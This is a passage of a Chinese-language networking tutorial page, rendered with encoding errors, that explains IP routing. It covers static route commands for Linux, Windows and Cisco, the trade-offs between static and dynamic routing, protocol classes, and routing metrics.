class="hljs-bullet">8.</span> è½¬å‘<br><br>å¤šæ¡åŒ¹é…æ—¶ï¼š<br><span class="hljs-bullet">1.</span> æœ€é•¿å‰ç¼€ä¼˜å…ˆ<br><span class="hljs-bullet">2.</span> å‰ç¼€é•¿åº¦ç›¸åŒï¼Œæ¯”è¾ƒåº¦é‡ï¼ˆMetricï¼‰<br><span class="hljs-bullet">3.</span> åº¦é‡ç›¸åŒï¼Œè´Ÿè½½å‡è¡¡ï¼ˆECMPï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="3-é™æ€è·¯ç”±"><a href="#3-é™æ€è·¯ç”±" class="headerlink" title="3. é™æ€è·¯ç”±"></a>3. é™æ€è·¯ç”±</h2><h3 id="3-1-é™æ€è·¯ç”±é…ç½®"><a href="#3-1-é™æ€è·¯ç”±é…ç½®" class="headerlink" title="3.1 é™æ€è·¯ç”±é…ç½®"></a>3.1 é™æ€è·¯ç”±é…ç½®</h3><p><strong>Linux</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ·»åŠ é™æ€è·¯ç”±</span><br><span class="hljs-comment"># æ ¼å¼ï¼šip route add &lt;ç›®æ ‡ç½‘ç»œ&gt; via &lt;ç½‘å…³&gt; dev &lt;æ¥å£&gt;</span><br><br><span class="hljs-comment"># æ·»åŠ ç½‘ç»œè·¯ç”±</span><br><span class="hljs-built_in">sudo</span> ip route add 192.168.2.0/24 via 192.168.1.254 dev eth0<br><br><span class="hljs-comment"># æ·»åŠ ä¸»æœºè·¯ç”±</span><br><span class="hljs-built_in">sudo</span> ip route add 10.1.1.100/32 via 192.168.1.254<br><br><span class="hljs-comment"># æ·»åŠ é»˜è®¤è·¯ç”±</span><br><span class="hljs-built_in">sudo</span> ip route add default via 192.168.1.1<br><br><span class="hljs-comment"># åˆ é™¤è·¯ç”±</span><br><span class="hljs-built_in">sudo</span> ip route del 192.168.2.0/24<br><br><span class="hljs-comment"># ä¿®æ”¹è·¯ç”±</span><br><span class="hljs-built_in">sudo</span> ip route replace 192.168.2.0/24 via 192.168.1.253 dev eth0<br><br><span class="hljs-comment"># æŒä¹…åŒ–é…ç½®ï¼ˆUbuntu/Debianï¼‰</span><br><span class="hljs-comment"># ç¼–è¾‘ /etc/network/interfaces</span><br>auto eth0<br>iface eth0 inet static<br>    address 192.168.1.10<br>    netmask 255.255.255.0<br>    gateway 192.168.1.1<br>    <span class="hljs-comment"># æ·»åŠ é™æ€è·¯ç”±</span><br>    up ip route add 192.168.2.0/24 via 192.168.1.254 dev eth0<br><br><span class="hljs-comment"># æŒä¹…åŒ–é…ç½®ï¼ˆCentOS/RHELï¼‰</span><br><span class="hljs-comment"># åˆ›å»º /etc/sysconfig/network-scripts/route-eth0</span><br>192.168.2.0/24 via 192.168.1.254 dev eth0<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># æ·»åŠ é™æ€è·¯ç”±<br>route add <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span><br><br># æ·»åŠ æŒä¹…è·¯ç”±ï¼ˆ-på‚æ•°ï¼‰<br>route add -p <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span><br><br># åˆ é™¤è·¯ç”±<br>route delete <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br># ä¿®æ”¹è·¯ç”±<br>route change <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">253</span><br></code></pre></td></tr></table></figure><p><strong>Ciscoè·¯ç”±å™¨</strong>ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arduino"># è¿›å…¥é…ç½®æ¨¡å¼<br>Router&gt; enable<br>Router<span class="hljs-meta"># configure terminal</span><br><br># æ·»åŠ é™æ€è·¯ç”±<br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route <span class="hljs-string">&lt;ç›®æ ‡ç½‘ç»œ&gt;</span> <span class="hljs-string">&lt;å­ç½‘æ©ç &gt;</span> <span class="hljs-string">&lt;ä¸‹ä¸€è·³æˆ–æ¥å£&gt;</span></span><br><br># ç¤ºä¾‹<br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route 192.168.2.0 255.255.255.0 192.168.1.254</span><br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route 192.168.2.0 255.255.255.0 GigabitEthernet0/1</span><br><br># æ·»åŠ é»˜è®¤è·¯ç”±<br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route 0.0.0.0 0.0.0.0 192.168.1.1</span><br><br># æŸ¥çœ‹è·¯ç”±è¡¨<br>Router<span class="hljs-meta"># show ip route</span><br><br>Codes: C - connected, S - <span class="hljs-type">static</span>, R - RIP, O - OSPF<br>       * - candidate <span class="hljs-keyword">default</span><br><br>Gateway of last resort is <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> to network <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><br>C    <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> is directly connected, GigabitEthernet0/<span class="hljs-number">0</span><br>C    <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> is directly connected, GigabitEthernet0/<span class="hljs-number">1</span><br>S    <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> [<span class="hljs-number">1</span>/<span class="hljs-number">0</span>] via <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.254</span><br>S*   <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span> [<span class="hljs-number">1</span>/<span class="hljs-number">0</span>] via <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><h3 id="3-2-é™æ€è·¯ç”±çš„ä¼˜ç¼ºç‚¹"><a href="#3-2-é™æ€è·¯ç”±çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="3.2 é™æ€è·¯ç”±çš„ä¼˜ç¼ºç‚¹"></a>3.2 é™æ€è·¯ç”±çš„ä¼˜ç¼ºç‚¹</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">ä¼˜ç‚¹ï¼š<br>âœ… é…ç½®ç®€å•<br>âœ… æ— éœ€åè®®å¼€é”€<br>âœ… ä¸å ç”¨<span class="hljs-variable">CPU</span>å’Œå¸¦å®½<br>âœ… å®‰å…¨ï¼ˆä¸ä¼šè¢«æ¬ºéª—ï¼‰<br>âœ… å¯é¢„æµ‹ï¼ˆè·¯å¾„å›ºå®šï¼‰<br>âœ… é€‚åˆå°å‹ç½‘ç»œ<br><br>ç¼ºç‚¹ï¼š<br>âŒ ä¸èƒ½è‡ªåŠ¨é€‚åº”ç½‘ç»œå˜åŒ–<br>âŒ é“¾è·¯æ•…éšœæ— æ³•è‡ªåŠ¨åˆ‡æ¢<br>âŒ å¤§å‹ç½‘ç»œé…ç½®ç¹ç<br>âŒ äººå·¥é…ç½®å®¹æ˜“å‡ºé”™<br>âŒ ç»´æŠ¤æˆæœ¬é«˜<br>âŒ æ‰©å±•æ€§å·®<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br>âœ… å°å‹ç½‘ç»œï¼ˆ<span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>ä¸ªè·¯ç”±å™¨ï¼‰<br>âœ… ç®€å•æ‹“æ‰‘<br>âœ… æœ«ç«¯ç½‘ç»œï¼ˆ<span class="hljs-built_in">Stub</span> <span class="hljs-variable">Network</span>ï¼‰<br>âœ… é»˜è®¤è·¯ç”±<br>âœ… ç‰¹å®šå®‰å…¨éœ€æ±‚<br>âœ… å®éªŒå’Œæµ‹è¯•ç¯å¢ƒ<br></code></pre></td></tr></table></figure><hr><h2 id="4-åŠ¨æ€è·¯ç”±åè®®"><a href="#4-åŠ¨æ€è·¯ç”±åè®®" class="headerlink" title="4. åŠ¨æ€è·¯ç”±åè®®"></a>4. åŠ¨æ€è·¯ç”±åè®®</h2><h3 id="4-1-åŠ¨æ€è·¯ç”±æ¦‚è¿°"><a href="#4-1-åŠ¨æ€è·¯ç”±æ¦‚è¿°" class="headerlink" title="4.1 åŠ¨æ€è·¯ç”±æ¦‚è¿°"></a>4.1 åŠ¨æ€è·¯ç”±æ¦‚è¿°</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠ¨æ€è·¯ç”± = Dynamic Routing<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">-</span> è·¯ç”±å™¨è‡ªåŠ¨å­¦ä¹ è·¯ç”±<br><span class="hljs-bullet">-</span> è‡ªåŠ¨é€‚åº”ç½‘ç»œå˜åŒ–<br><span class="hljs-bullet">-</span> é“¾è·¯æ•…éšœè‡ªåŠ¨åˆ‡æ¢<br><span class="hljs-bullet">-</span> è·¯ç”±å™¨ä¹‹é—´äº¤æ¢ä¿¡æ¯<br><br>å·¥ä½œåŸç†ï¼š<br><span class="hljs-bullet">1.</span> è·¯ç”±å™¨å¯åŠ¨<br><span class="hljs-bullet">2.</span> å‘ç°é‚»å±…è·¯ç”±å™¨<br><span class="hljs-bullet">3.</span> äº¤æ¢è·¯ç”±ä¿¡æ¯<br><span class="hljs-bullet">4.</span> è®¡ç®—æœ€ä½³è·¯å¾„<br><span class="hljs-bullet">5.</span> æ›´æ–°è·¯ç”±è¡¨<br><span class="hljs-bullet">6.</span> å®šæœŸæ›´æ–°æˆ–äº‹ä»¶è§¦å‘æ›´æ–°<br><br>ä¼˜ç‚¹ï¼š<br>âœ… è‡ªåŠ¨å­¦ä¹ è·¯ç”±<br>âœ… è‡ªåŠ¨é€‚åº”å˜åŒ–<br>âœ… é“¾è·¯å†—ä½™å’Œè´Ÿè½½å‡è¡¡<br>âœ… é€‚åˆå¤§å‹ç½‘ç»œ<br>âœ… å‡å°‘äººå·¥é…ç½®<br><br>ç¼ºç‚¹ï¼š<br>âŒ å ç”¨å¸¦å®½ï¼ˆåè®®æŠ¥æ–‡ï¼‰<br>âŒ å ç”¨CPUï¼ˆè·¯ç”±è®¡ç®—ï¼‰<br>âŒ å ç”¨å†…å­˜ï¼ˆè·¯ç”±è¡¨ï¼‰<br>âŒ é…ç½®å¤æ‚<br>âŒ æ”¶æ•›æ—¶é—´ï¼ˆç½‘ç»œå˜åŒ–åˆ°ç¨³å®šçš„æ—¶é—´ï¼‰<br>âŒ å¯èƒ½è¢«æ”»å‡»<br><br>ä½•æ—¶ä½¿ç”¨ï¼Ÿ<br><span class="hljs-bullet">-</span> å¤§å‹ç½‘ç»œ<br><span class="hljs-bullet">-</span> å¤æ‚æ‹“æ‰‘<br><span class="hljs-bullet">-</span> éœ€è¦è‡ªåŠ¨æ•…éšœæ¢å¤<br><span class="hljs-bullet">-</span> ç½‘ç»œç»å¸¸å˜åŒ–<br></code></pre></td></tr></table></figure><h3 id="4-2-åŠ¨æ€è·¯ç”±åè®®åˆ†ç±»"><a href="#4-2-åŠ¨æ€è·¯ç”±åè®®åˆ†ç±»" class="headerlink" title="4.2 åŠ¨æ€è·¯ç”±åè®®åˆ†ç±»"></a>4.2 åŠ¨æ€è·¯ç”±åè®®åˆ†ç±»</h3><p><strong>æŒ‰å·¥ä½œèŒƒå›´åˆ†ç±»</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> IGPï¼ˆInterior Gateway Protocolï¼‰<br>   å†…éƒ¨ç½‘å…³åè®®<br><span class="hljs-bullet">   -</span> åœ¨è‡ªæ²»ç³»ç»Ÿï¼ˆASï¼‰å†…ä½¿ç”¨<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šRIP, OSPF, IS-IS, EIGRP<br><br><span class="hljs-bullet">2.</span> EGPï¼ˆExterior Gateway Protocolï¼‰<br>   å¤–éƒ¨ç½‘å…³åè®®<br><span class="hljs-bullet">   -</span> åœ¨è‡ªæ²»ç³»ç»Ÿä¹‹é—´ä½¿ç”¨<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šBGP<br><br>è‡ªæ²»ç³»ç»Ÿï¼ˆASï¼‰ï¼š<br><span class="hljs-bullet">-</span> ç”±å•ä¸€ç»„ç»‡ç®¡ç†çš„ç½‘ç»œé›†åˆ<br><span class="hljs-bullet">-</span> æœ‰ç»Ÿä¸€çš„è·¯ç”±ç­–ç•¥<br><span class="hljs-bullet">-</span> åˆ†é…å”¯ä¸€çš„ASå·<br><span class="hljs-bullet">-</span> ç¤ºä¾‹ï¼š<br><span class="hljs-bullet">  -</span> AS 4134ï¼šä¸­å›½ç”µä¿¡<br><span class="hljs-bullet">  -</span> AS 15169ï¼šGoogle<br><span class="hljs-bullet">  -</span> AS 32934ï¼šFacebook<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚          äº’è”ç½‘                         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚   AS 100     â”‚   AS 200     â”‚  AS 300   â”‚<br>â”‚   (å…¬å¸A)    â”‚   (å…¬å¸B)    â”‚  (ISP)    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  å†…éƒ¨ä½¿ç”¨    â”‚  å†…éƒ¨ä½¿ç”¨    â”‚ å†…éƒ¨ä½¿ç”¨  â”‚<br>â”‚  OSPF (IGP)  â”‚  RIP (IGP)   â”‚ OSPF (IGP)â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚        ASä¹‹é—´ä½¿ç”¨BGP (EGP)              â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>æŒ‰ç®—æ³•åˆ†ç±»</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> è·ç¦»çŸ¢é‡ï¼ˆDistance Vectorï¼‰<br><span class="hljs-bullet">   -</span> åŸºäºBellman-Fordç®—æ³•<br><span class="hljs-bullet">   -</span> åªçŸ¥é“æ–¹å‘å’Œè·ç¦»<br><span class="hljs-bullet">   -</span> å®šæœŸå¹¿æ’­æ•´ä¸ªè·¯ç”±è¡¨<br><span class="hljs-bullet">   -</span> æ”¶æ•›æ…¢<br><span class="hljs-bullet">   -</span> åè®®ï¼šRIP, IGRP<br><br>   ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">   -</span> &quot;è°£è¨€è·¯ç”±&quot;<br><span class="hljs-bullet">   -</span> è·¯ç”±å™¨åªä»é‚»å±…å­¦ä¹ <br><span class="hljs-bullet">   -</span> ä¸çŸ¥é“å®Œæ•´æ‹“æ‰‘<br><br>   æ¯”å–»ï¼š<br>   é—®è·¯ï¼š&quot;å»ç«è½¦ç«™æ€ä¹ˆèµ°ï¼Ÿ&quot;<br>   ç­”ï¼š&quot;æˆ‘ä¸çŸ¥é“åœ¨å“ªï¼Œä½†å¾€å‰èµ°3ä¸ªè·¯å£ï¼Œé—®é‚£è¾¹çš„äºº&quot;<br><br><span class="hljs-bullet">2.</span> é“¾è·¯çŠ¶æ€ï¼ˆLink Stateï¼‰<br><span class="hljs-bullet">   -</span> åŸºäºDijkstraç®—æ³•ï¼ˆSPFï¼‰<br><span class="hljs-bullet">   -</span> çŸ¥é“æ•´ä¸ªç½‘ç»œæ‹“æ‰‘<br><span class="hljs-bullet">   -</span> åªä¼ æ’­é“¾è·¯çŠ¶æ€å˜åŒ–<br><span class="hljs-bullet">   -</span> æ”¶æ•›å¿«<br><span class="hljs-bullet">   -</span> åè®®ï¼šOSPF, IS-IS<br><br>   ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">   -</span> æ¯ä¸ªè·¯ç”±å™¨æœ‰å®Œæ•´æ‹“æ‰‘å›¾<br><span class="hljs-bullet">   -</span> ç‹¬ç«‹è®¡ç®—æœ€çŸ­è·¯å¾„<br><span class="hljs-bullet">   -</span> æ›´å‡†ç¡®ï¼Œæ›´å¿«<br><br>   æ¯”å–»ï¼š<br>   æœ‰ä¸€å¼ å®Œæ•´åœ°å›¾ï¼Œè‡ªå·±è®¡ç®—æœ€çŸ­è·¯å¾„<br><br><span class="hljs-bullet">3.</span> æ··åˆå‹ï¼ˆHybridï¼‰<br><span class="hljs-bullet">   -</span> ç»“åˆä¸¤è€…ä¼˜ç‚¹<br><span class="hljs-bullet">   -</span> åè®®ï¼šEIGRPï¼ˆCiscoä¸“æœ‰ï¼‰<br><br>å¯¹æ¯”ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ç‰¹æ€§      â”‚   è·ç¦»çŸ¢é‡     â”‚    é“¾è·¯çŠ¶æ€    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ æ‹“æ‰‘çŸ¥è¯†     â”‚   éƒ¨åˆ†ï¼ˆé‚»å±…ï¼‰ â”‚   å®Œæ•´         â”‚<br>â”‚ è·¯ç”±è®¡ç®—     â”‚   åˆ†å¸ƒå¼       â”‚   ç‹¬ç«‹         â”‚<br>â”‚ æ›´æ–°æ–¹å¼     â”‚   æ•´ä¸ªè·¯ç”±è¡¨   â”‚   é“¾è·¯çŠ¶æ€å˜åŒ– â”‚<br>â”‚ æ”¶æ•›é€Ÿåº¦     â”‚   æ…¢           â”‚   å¿«           â”‚<br>â”‚ CPUå ç”¨      â”‚   ä½           â”‚   é«˜           â”‚<br>â”‚ å†…å­˜å ç”¨     â”‚   ä½           â”‚   é«˜           â”‚<br>â”‚ å¸¦å®½å ç”¨     â”‚   é«˜ï¼ˆå®šæœŸï¼‰   â”‚   ä½ï¼ˆå˜åŒ–æ—¶ï¼‰ â”‚<br>â”‚ æ‰©å±•æ€§       â”‚   å·®           â”‚   å¥½           â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="4-3-è·¯ç”±åº¦é‡ï¼ˆMetricï¼‰"><a href="#4-3-è·¯ç”±åº¦é‡ï¼ˆMetricï¼‰" class="headerlink" title="4.3 è·¯ç”±åº¦é‡ï¼ˆMetricï¼‰"></a>4.3 è·¯ç”±åº¦é‡ï¼ˆMetricï¼‰</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åº¦é‡ = Metric = è·¯ç”±çš„&quot;ä»£ä»·&quot;<br><br>ä½œç”¨ï¼š<br><span class="hljs-bullet">-</span> è¯„ä¼°è·¯å¾„çš„ä¼˜åŠ£<br><span class="hljs-bullet">-</span> é€‰æ‹©æœ€ä½³è·¯å¾„<br><span class="hljs-bullet">-</span> æ•°å€¼è¶Šå°è¶Šå¥½<br><br>å¸¸è§åº¦é‡ç±»å‹ï¼š<br><br><span class="hljs-bullet">1.</span> è·³æ•°ï¼ˆHop Countï¼‰<br><span class="hljs-bullet">   -</span> ç»è¿‡çš„è·¯ç”±å™¨æ•°é‡<br><span class="hljs-bullet">   -</span> RIPä½¿ç”¨<br><span class="hljs-bullet">   -</span> ç®€å•ä½†ä¸å‡†ç¡®<br><span class="hljs-bullet">   -</span> æœ€å¤§15è·³<br><br>   ç¤ºä¾‹ï¼š<br>   è·¯å¾„1: A â†’ B â†’ C â†’ D (3è·³)<br>   è·¯å¾„2: A â†’ E â†’ D (2è·³ï¼Œé€‰æ‹©æ­¤è·¯å¾„)<br>   ä½†è·¯å¾„2å¯èƒ½æ˜¯æ…¢é€Ÿé“¾è·¯ï¼<br><br><span class="hljs-bullet">2.</span> å¸¦å®½ï¼ˆBandwidthï¼‰<br><span class="hljs-bullet">   -</span> é“¾è·¯é€Ÿåº¦<br><span class="hljs-bullet">   -</span> OSPFé»˜è®¤ä½¿ç”¨<br><span class="hljs-bullet">   -</span> Cost = 10^8 / å¸¦å®½(bps)<br><br>   ç¤ºä¾‹ï¼š<br>   100Mbpsé“¾è·¯ï¼šCost = 10^8 / 10^8 = 1<br>   10Mbpsé“¾è·¯ï¼šCost = 10^8 / 10^7 = 10<br>   1Mbpsé“¾è·¯ï¼šCost = 10^8 / 10^6 = 100<br><br><span class="hljs-bullet">3.</span> å»¶è¿Ÿï¼ˆDelayï¼‰<br><span class="hljs-bullet">   -</span> ä¼ è¾“æ—¶é—´<br><span class="hljs-bullet">   -</span> EIGRPè€ƒè™‘<br><span class="hljs-bullet">   -</span> å•ä½ï¼šå¾®ç§’<br><br><span class="hljs-bullet">4.</span> è´Ÿè½½ï¼ˆLoadï¼‰<br><span class="hljs-bullet">   -</span> é“¾è·¯åˆ©ç”¨ç‡<br><span class="hljs-bullet">   -</span> EIGRPè€ƒè™‘<br><br><span class="hljs-bullet">5.</span> å¯é æ€§ï¼ˆReliabilityï¼‰<br><span class="hljs-bullet">   -</span> é“¾è·¯è´¨é‡<br><span class="hljs-bullet">   -</span> ä¸¢åŒ…ç‡<br><span class="hljs-bullet">   -</span> 